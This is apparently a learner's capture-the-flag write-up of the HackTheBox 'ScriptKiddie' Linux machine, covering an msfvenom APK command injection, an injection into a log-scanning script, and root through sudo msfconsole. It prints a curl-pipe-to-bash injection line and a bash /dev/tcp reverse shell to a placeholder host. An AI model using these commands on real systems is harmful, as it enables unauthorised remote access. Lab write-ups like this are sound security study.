---
title: "ScriptKiddie HTB"
date: 2021-08-28T17:30:30
categories:
  - study
tags:
- Linux
- Outdated Software
classes: wide
---
ScriptKiddie is an easy rated Linux box from May 2021. The HTB writeup PDF describes it as:

>*"ScriptKiddie is an easy difficulty Linux machine that presents a Metasploit vulnerability (CVE-2020-7384), 
along with classic attacks such as OS command injection and an insecure passwordless sudo configuration. "*

[Link.][htbboxlink]

[htbboxlink]: https://app.hackthebox.eu/machines/scriptkiddie

<h2> Enumeration</h2>
**Nmap scan results:**

```
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    syn-ack Werkzeug httpd 0.16.1 (Python 3.8.5)
| http-methods: 
|_  Supported Methods: GET POST HEAD OPTIONS
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<h4>What is the scan telling us?</h4>

- Port 22 is open running ssh, specifically OpenSSH 8.2p1 on Ubuntu.
- Reveals a web server on 5000, with Werkzeug 0.16.1 running on Python 3.8.5. [Werkzeug](https://werkzeug.palletsprojects.com/en/2.0.x/) is *"a comprehensive WSGI web application library."* 

[WSGI](https://wsgi.readthedocs.io/en/latest/what.html) refers to:

>*"Web Server Gateway Interface. It is a specification that describes how a web server communicates with web applications, and how web applications can be chained together to process one request."*

Accessing the site at http://10.10.10.226:5000/ we see 3 inputs for a basic "hackers toolbox".

There are numerous "tools" present on the page, including a Nmap, msfvenom and a SearchSploit tool. 

I assume that the Nmap and SearchSploit simply run the binaries and display results. The venom generator allows us to upload files to it, this 
could be a potential exploit point. But at this point I am lost, reading writeups it seems that the vulnerability is within msfvenom 
itself. This [Github page](https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md) by the exploit author Justin Steven explains the vuln and references it as [CVE-2020-7384](https://nvd.nist.gov/vuln/detail/CVE-2020-7384). They explain that:

>*"There is a command injection vulnerability in msfvenom when using a crafted APK file as an Android payload template.
Metasploit Framework provides the msfvenom tool for payload generation. For many of the payload types provided by msfvenom, it allows the user to provide a "template" using the -x option."*

It seems that using a "poisoned" or evil APK file as a template can result in command injection on the template user's system. More details:

>*"An attacker who could trick an msfvenom user into using a crafted APK file as a template could execute arbitrary commands on the user's system.
For example, an attacker could prepare and publish a crafted APK file that they believe is an enticing template. If a user of Metasploit Framework obtains that APK file and attempts to use it as an msfvenom template, arbitrary commands can be executed on that user's machine."*

For this it seems the following criteria can result in a command injection vuln:

>*"If a crafted APK file has a signature with an "Owner" field containing A single quote (to escape the single-quoted string) followed by shell metacharacters."*




<h2>Foothold</h2>

We follow the instructions from the previously referenced Github page. Which involved downloading a python script to generate an "evil.apk" file, the script will: 

>*"produce a crafted APK file that executes a given command-line payload when used as a template."*

In this case we will be using it to execute a reverse shell on the box.
We start our Netcat listener, set the target as Android on the website, we do this because APK files are Android Package files. 
We then upload the APK and catch the shell. Now we have a shell, we upgrade to a tty with `/usr/bin/script -qc /bin/bash /dev/null`. 

We find the user flag in `kid`'s home folder.

<h2>Lateral movement</h2>
I am way out of my depth here.

According to the writeups it seems that lateral movement to another user is required.
We see that there is a script called `scanlosers.sh` in a user called `pwn`'s home directory. 
Reading the script we see that it reads rows from the `/home/kid/logs/hackers` file to read IP addresses and run nmap on them: We find the other logs in `./html`, a handy command is:

```bash
kid@scriptkiddie:~/html$ grep -R logs .
grep -R logs .
./app.py:        with open('/home/kid/logs/hackers', 'a') as f:
```
This searches recursively files for the presence of logs.

We see that `app.py` writes to `/home/kid/logs/hackers.`

Reading app.py we see that it writes to the logs directory when non-alphanumeric characters are input into the website's SearchSploit field. 
The writer assumes that submitted non-alpha characters represent an attempt to *"hacK"* them. So the script notes ip addresses of users who submit them in a log and run Nmap on them. 

`scanlosers.sh` does not perform any input validation so we can perform "arbitrary OS command injection" by inputting our reverse shell in there. [Ippsec](https://youtu.be/Yn3iGF8xMQI?t=1979) does an excellent analysis of `scanlosers.sh`, after watching their video I now understand why our command would be executed.

```bash
#!/bin/bash
 
log=/home/kid/logs/hackers
 
cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done
 
if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi

```

We can see that the script reads the log file, then field separates the log based upon a single character separator of a ' ' space. Every field from the third field onward is treated as an ip.

Once the script determines what an ip is, it is then nmap'd by the command in the `do` part of the script:

```bash
sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null"
```

Ippsec points out that if the log file contains a string that has whatever for the initial two fields and then a semicolon, it would essentially nullify the first part of the command which is `nmap --top-ports 10 -oN recon/$`. 

Then a desired command can be placed in the third field, which is then ended with a hash(#) to comment out the rest of the command `.nmap ${ip} 2>&1 >/dev/null`. Their example is:

```bash
echo 'abc def ;curl 10.10.14.2:8000/rev.sh | bash #' > hackers
```

This would result in the initial and end part of the original command being nullified by `;` and `#`. As the first part is not a command so does not execute, then our command is read, and then the end of the original command is commented out.
Our command would then be executed by `scanlosers.sh`, giving us a shell as `pwn` as `pwn` owns `scanlosers.sh`. 

Putting our reverse shell into `/home/kid/logs/hackers.` with: 
`echo 'a b $(bash -c "bash -i &>/dev/tcp/YOURIP/YOURPORT 0>&1")' > /home/kid/logs/hackers` 
gives us the reverse shell as pwn.

<h2>Privilege Escalation</h2>

Now that we are `pwn`, running `sudo -l` we see:

```bash
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

Since we can run msfconsole as sudo, we simply run it as sudo and then drop into the integrated ruby shell with command `irb`. 
Then run `system("/bin/bash")` which drops us into a root shell, and the root flag can be found in the usual `/root/root.txt`.

<h4>For next time:</h4>

- Enumerate the contents of the home directories more carefully, figure out what scripts are doing and what they may be writing to.
- Ippsec uses pspy alot, which seems to be a good process monitor. Run it, and then interact with the website to see what processes are called and when.
- Learn bash.
- Things sometimes write logs, in which case figure out where they are writing to and what else uses them.
- As for foothold, try to find a CVE on everything, don't be afraid to just try them. It isn't a race.

